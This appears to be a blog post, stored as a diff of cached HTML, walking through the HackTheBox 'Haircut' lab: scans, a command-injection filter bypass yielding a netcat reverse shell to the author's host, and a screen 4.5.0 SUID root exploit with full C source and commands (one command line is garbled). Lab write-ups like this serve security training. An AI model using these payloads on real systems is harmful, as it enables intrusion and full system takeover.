@@ -1,0 +1,345 @@
+I"g<<p><img src="assets/img/haircut-htb/icon.png" alt="" /></p>
+
+<p><strong>Hey Guys!</strong> In this blogpost, we are going to pwn <strong>Haircut</strong> from <a href="https://www.hackthebox.eu">HackTheBox</a>. But before that, let me give you a brief overview of what we are going to do :</p>
+
+<ul>
+  <li>We first scan the box to find a <strong>SSH</strong> and <strong>Web</strong> service.</li>
+  <li>Enumerating the website, we find an interesting <strong>php</strong> file.</li>
+  <li>Then, we get a low privilege <strong>shell</strong> by exploiting a <strong>command injection</strong> vulnerability.</li>
+  <li>Finally, we get root by exploitting a <strong>SUID bit</strong> set binary.</li>
+</ul>
+
+<p>With that said, let us begin.</p>
+
+<h1 id="scanning-"><a href="#header-1"></a>SCANNING :</h1>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# nmap -sC -sV 10.10.10.24
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-26 12:26 EST
+Nmap scan report for 10.10.10.24
+Host is up (0.58s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 (RSA)
+|   256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 (ECDSA)
+|_  256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 (ED25519)
+80/tcp open  http    nginx 1.10.0 (Ubuntu)
+|_http-server-header: nginx/1.10.0 (Ubuntu)
+|_http-title:  HTB Hairdresser 
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 42.24 seconds
+</code></pre></div></div>
+
+<p>We have done a <strong>nmap</strong> scan with version detection (-sV) and default scripts scan (-sC).</p>
+
+<p>It is revealed that ports 22 and 80 are open.</p>
+
+<p><strong>OpenSSH 7.2p2 Ubuntu 4ubuntu2.2</strong> is running on port 22 while <strong>nginx 1.10.0</strong> on port 80.</p>
+
+<p>This should be enough in the scanning phase. Let us move to enumeration now.</p>
+
+<h1 id="enumerating-http"><a href="#header-1"></a>ENUMERATING HTTP:</h1>
+
+<p>Since <strong>HTTP</strong> has large attack vector, let us begin with that.</p>
+
+<p>By visiting the webpage through the browser, we get :</p>
+
+<p><img src="assets/img/haircut-htb/web-1.png" alt="" /></p>
+
+<p>Finding nothing interesting here, I decided to brute force for directories/files.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# gobuster dir -u http://10.10.10.24 -w /usr/share/wordlists/dirb/big.txt -x html,php -t 30
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.24
+[+] Threads:        30
+[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     html,php
+[+] Timeout:        10s
+===============================================================
+2021/02/26 12:30:39 Starting gobuster
+===============================================================
+/hair.html (Status: 200)
+/index.html (Status: 200)
+/test.html (Status: 200)
+/uploads (Status: 301)
+===============================================================
+2021/02/26 12:46:49 Finished
+===============================================================
+</code></pre></div></div>
+
+<p>I used <strong>gobuster</strong> with a small wordlist from <strong>dirb</strong>’s <strong>big.txt</strong>. We find some files in result:</p>
+
+<ul>
+  <li><strong>hair.html</strong></li>
+</ul>
+
+<p><img src="assets/img/haircut-htb/web-2.png" alt="" /></p>
+
+<ul>
+  <li><strong>test.html</strong></li>
+</ul>
+
+<p><img src="assets/img/haircut-htb/web-3.png" alt="" /></p>
+
+<ul>
+  <li><strong>uploads</strong></li>
+</ul>
+
+<p><img src="assets/img/haircut-htb/web-4.png" alt="" /></p>
+
+<p>The <strong>hair.html</strong>, <strong>test.html</strong> did not give us something interesting. The <strong>uploads</strong> gives us a <strong>403 forbidden</strong> response.</p>
+
+<p>Guess we have to use a little bigger wordlist.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# gobuster dir -u http://10.10.10.24 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x html,php -t 30
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.24
+[+] Threads:        30
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     html,php
+[+] Timeout:        10s
+===============================================================
+2021/02/26 12:47:28 Starting gobuster
+===============================================================
+/index.html (Status: 200)
+/uploads (Status: 301)
+/test.html (Status: 200)
+/hair.html (Status: 200)
+/exposed.php (Status: 200)
+===============================================================
+2021/02/26 13:13:11 Finished
+===============================================================
+</code></pre></div></div>
+
+<p>This time I used <strong>dirbuster</strong>’s <strong>small.txt</strong> wordlist. As you can see, now we have an extra <strong>PHP</strong> file called <strong>exposed.php</strong></p>
+
+<p><img src="assets/img/haircut-htb/web-5.png" alt="" /></p>
+
+<p>It seems the <strong>php</strong> file is using <strong>curl</strong> to fetch a file. Let us check if we can include <strong>remote</strong> files too.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# cat test-2.html 
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+        &lt;head&gt;&lt;/head&gt;
+        &lt;body&gt;
+                &lt;h1&gt;Testing for remote inclusion&lt;/h1&gt;
+                &lt;h2&gt;By Nehal&lt;/h2&gt;
+        &lt;/body&gt;
+&lt;/html&gt;
+root@kali:~# python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+
+</code></pre></div></div>
+
+<p>I have made an <strong>HTML</strong> page and served it using <strong>Python</strong>’s local server.</p>
+
+<p><img src="assets/img/haircut-htb/web-6.png" alt="" /></p>
+
+<p>As you can see, the <strong>test-2.html</strong> file from my box is successfully fetched and is executed.</p>
+
+<p>Now, it is time for exploitation.</p>
+
+<h1 id="exploitation"><a href="#header-1"></a>EXPLOITATION:</h1>
+
+<p>Since we can include remote files, let us serve <strong>php-reverse-shell</strong> and see if we can get a shell back.</p>
+
+<p><img src="assets/img/haircut-htb/web-7.png" alt="" /></p>
+
+<p>Instead of running the php file, the box just prints the file contents, so we did not get a shell. Let us try some alternatives.</p>
+
+<p>I put the request to my burp repeater to see if I can chain any command to the url. The common methods include :</p>
+
+<h3 id="url--cmd">&lt;URL&gt; | &lt;cmd&gt;</h3>
+<h3 id="url--cmd-1">&lt;URL&gt; || &lt;cmd&gt;</h3>
+<h3 id="url--cmd-2">&lt;URL&gt; ; &lt;cmd&gt;</h3>
+<h3 id="url-cmd">&lt;URL&gt; `&lt;cmd&gt;`</h3>
+
+<p>There are many other techniques too. However, in this case, the `&lt;cmd&gt;` worked.</p>
+
+<p><img src="assets/img/haircut-htb/web-8.png" alt="" /></p>
+
+<p>You can see, I have chained <code class="language-plaintext highlighter-rouge">id</code> command to the url and the output of the command is shown in the response.</p>
+
+<p>Great. We can inject commands now.</p>
+
+<p>Let us now check if we can get a shell.</p>
+
+<p><img src="assets/img/haircut-htb/web-9.png" alt="" /></p>
+
+<p>When I tried to use <code class="language-plaintext highlighter-rouge">nc</code> to get a reverse shell, it says we can not use it. Probably, there is a sort of filtering going on.</p>
+
+<p>Let us see if we can bypass the filters.</p>
+
+<p>There is a cheatsheet on command injection filter bypass on github. You can find it <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection">here</a>.</p>
+
+<p>There is a way in which we insert quotations around the letters of the filtered keyword to bypass the filtering.</p>
+
+<p>So, our payload will become : <code class="language-plaintext highlighter-rouge">n"c" 10.10.14.13 443 -e /bin/sh</code>.</p>
+
+<p>Set up a listener and see if this works.</p>
+
+<p><img src="assets/img/haircut-htb/web-10.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.14.13] from (UNKNOWN) [10.10.10.24] 41688
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@haircut:~/html$
+</code></pre></div></div>
+
+<p>As you can see, that worked and we are in. You can read the user flag now.</p>
+
+<h1 id="privilege-escalation"><a href="#header-1"></a>PRIVILEGE ESCALATION:</h1>
+
+<p>Let us begin by checking for <strong>SUID</strong> files.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@haircut:~$ find / -type f -perm -4000 2&gt;/dev/null
+/bin/ntfs-3g
+/bin/ping6
+/bin/fusermount
+/bin/su
+/bin/mount
+/bin/ping
+/bin/umount
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/bin/newuidmap
+/usr/bin/newgrp
+/usr/bin/newgidmap
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/bin/passwd
+/usr/bin/screen-4.5.0
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+</code></pre></div></div>
+
+<p>A <strong>trained eye</strong> must have noticed something here. The <strong>screen</strong> binary with version <strong>4.5.0</strong> is vulnerable to a local privilege escalation.</p>
+
+<p>There is an exploit for this on <a href="https://www.exploit-db.com/exploits/41154">exploit-db</a>.</p>
+
+<p>Let us download the exploit in our local box and play with it a bit.</p>
+
+<p>First, the exploit creates a <strong>C</strong> file <strong>libhax.c</strong>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# cat libhax.c 
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+__attribute__ ((__constructor__))
+void dropshell(void){
+    chown("/tmp/rootshell", 0, 0);
+    chmod("/tmp/rootshell", 04755);
+    unlink("/etc/ld.so.preload");
+    printf("[+] done!\n");
+}
+</code></pre></div></div>
+
+<p>The <strong>C-file</strong> changes the ownership of a file <strong>/tmp/rootshell</strong> to <strong>root</strong>. Then it sets the <strong>SUID</strong> bit set for the same file. After that, it deletes a shared object file <strong>/etc/ld.so.preload</strong>. We are going to generate the shared object file for <strong>libhax.c</strong></p>
+
+<p>Then the exploit creates another <strong>C-file</strong> called <strong>rootshell.c</strong>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# cat rootshell.c 
+#include &lt;stdio.h&gt;
+int main(void){
+    setuid(0);
+    setgid(0);
+    seteuid(0);
+    setegid(0);
+    execvp("/bin/sh", NULL, NULL);
+}
+</code></pre></div></div>
+
+<p>This file just set the <strong>UID</strong> and <strong>GID</strong> to <strong>0</strong>. Then it calls the <strong>/bin/sh</strong> binary to get a shell.</p>
+
+<p>Now, let us compile them and serve to the remote box.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# gcc -fPIC -shared -ldl -o libhax.so libhax.c
+libhax.c: In function ‘dropshell’:
+libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]
+    7 |     chmod("/tmp/rootshell", 04755);
+      |     ^~~~~
+root@kali:~# gcc -o rootshell rootshell.c
+rootshell.c: In function ‘main’:
+rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
+    3 |     setuid(0);
+      |     ^~~~~~
+rootshell.c:4:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
+    4 |     setgid(0);
+      |     ^~~~~~
+rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’ [-Wimplicit-function-declaration]
+    5 |     seteuid(0);
+      |     ^~~~~~~
+rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
+    6 |     setegid(0);
+      |     ^~~~~~~
+rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
+    7 |     execvp("/bin/sh", NULL, NULL);
+      |     ^~~~~~
+rootshell.c:7:5: warning: too many arguments to built-in function ‘execvp’ expecting 2 [-Wbuiltin-declaration-mismatch]
+root@kali:~# python3 -m http.server 80
+\Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.24 - - [26/Feb/2021 13:36:35] "GET /libhax.so HTTP/1.1" 200 -
+10.10.10.24 - - [26/Feb/2021 13:36:55] "GET /rootshell HTTP/1.1" 200 -
+</code></pre></div></div>
+
+<p>Ignore the warnings. As long as there is no error, we are good.</p>
+
+<p>Let us do some magic now on the remote box.</p>
+
+<p>First, we change our directory to <code class="language-plaintext highlighter-rouge">/etc</code> and we set the <code class="language-plaintext highlighter-rouge">umask</code> to <strong>000</strong>. Then we use vulnerable <code class="language-plaintext highlighter-rouge">screen</code> to link the <strong>libhax.so</strong> to the <code class="language-plaintext highlighter-rouge">/etc/ld.so.preload</code> that we deleted a moment ago. After that we trigger the binary with <code class="language-plaintext highlighter-rouge">screen -ls</code>. This should make our <strong>/tmp/rootshell</strong> to be owned by root and set the <strong>SUID bit</strong> for this. Now we just need to run the <strong>rootshell</strong> binary.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@haircut:/tmp$ cd /etc
+www-data@haircut:/etc$ umask 000
+so"-data@haircut:/etc$ screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax. 
+www-data@haircut:/etc$ screen -ls
+' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+[+] done!
+No Sockets found in /tmp/screens/S-www-data.
+
+www-data@haircut:/etc$ /tmp/rootshell
+# 
+# 
+# id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+# passwd root
+Enter new UNIX password: 
+Retype new UNIX password: 
+passwd: password updated successfully
+# su root
+root@haircut:/etc# id &amp;&amp; hostname
+uid=0(root) gid=0(root) groups=0(root)
+haircut
+root@haircut:/etc# 
+</code></pre></div></div>
+
+<p>And that is it, we are <strong>root</strong>.</p>
+
+<p>So that was <strong>Haircut</strong> from <strong>HackTheBox</strong>.</p>
+
+<p><strong>Thanks</strong> for reading this far. Hope you liked it :)</p>
+
+<p>I will see you in the next write-up. <strong>PEACE</strong>.</p>
+
+:ET
